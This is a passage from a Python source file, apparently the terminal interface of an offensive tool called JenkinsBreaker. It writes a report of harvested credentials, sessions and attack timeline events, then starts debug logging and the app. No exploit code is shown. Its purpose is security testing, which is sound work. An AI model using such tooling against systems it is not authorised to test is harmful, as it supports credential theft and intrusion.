                        f.write(f"- **{item.get('username', 'N/A')}** (Source: {item.get('source', 'Unknown')})\n")

                f.write("\n## Timeline\n\n")
                for event in timeline:
                    f.write(f"- `{event['timestamp'][:19]}` - **{event['action']}** on {event['target']}: {event['details']}\n")

            log.log_success(f"Report generated: {report_file}")
            log.log_info(f"  Sessions: {len(sessions)}")
            log.log_info(f"  Credentials: {len([l for l in loot if l['type'] == 'credential'])}")
            log.log_info(f"  Timeline events: {len(timeline)}")

        except Exception as e:
            log.log_error(f"Report generation failed: {str(e)}")


def main():
    """Entry point for TUI."""
    from jenkins_breaker.utils.logger import setup_logging
    import logging
    from pathlib import Path
    
    log_dir = Path("logs")
    log_dir.mkdir(exist_ok=True)
    
    setup_logging(
        level=logging.DEBUG,
        log_file=str(log_dir / "jenkinsbreaker.log"),
        console_output=False
    )
    
    app = JenkinsBreakerTUI()
    app.run()


if __name__ == "__main__":
    main()
